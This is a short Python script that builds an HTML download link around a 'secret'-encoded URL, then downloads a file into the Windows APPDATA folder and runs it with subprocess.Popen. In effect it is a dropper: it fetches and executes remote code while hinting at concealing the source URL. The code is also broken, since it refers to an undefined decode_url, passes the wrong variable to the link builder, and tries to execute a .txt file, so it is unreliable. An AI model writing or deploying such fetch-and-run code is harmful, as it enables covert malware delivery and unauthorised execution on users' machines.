import os
import requests
import subprocess

def create_download_link(url):
    return f"<a href='{encoded_url}' download></a>"

def encode_url(url):
    # Replace this with your secret encoding method
    return url

def download_and_run_file(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(save_path, "wb") as file:
            file.write(response.content)
        subprocess.Popen(save_path)  # Run the downloaded file
        return True
    else:
        return False

def get_appdata_path():
    appdata_path = os.getenv('APPDATA')
    return appdata_path

# Example usage
url = "http://example.com/example_file.txt"
encoded_url = encode_url(url)  # Replace this with your secret encoding method
download_link = create_download_link(url)
print(download_link)

# When the user clicks the link, you can call the download_and_run_file function
file_url = decode_url(encoded_url)  # Replace this with your secret decoding method
appdata_path = get_appdata_path()
file_name = 'example_file.txt'
save_path = os.path.join(appdata_path, file_name)
result = download_and_run_file(file_url, save_path)
if result:
    print("File downloaded and executed successfully.")
else:
    print("Failed to download and execute the file.")